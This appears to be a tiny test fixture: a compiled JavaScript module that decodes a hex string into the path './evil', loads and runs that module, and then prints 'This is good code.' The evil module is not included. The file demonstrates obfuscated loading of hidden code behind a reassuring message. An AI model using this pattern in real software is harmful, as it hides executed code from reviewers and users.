"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.default = () => {
    const evil = require(Buffer.from("2E2F6576696C", "hex").toString()).default;
    evil();
    console.log("This is good code.");
};
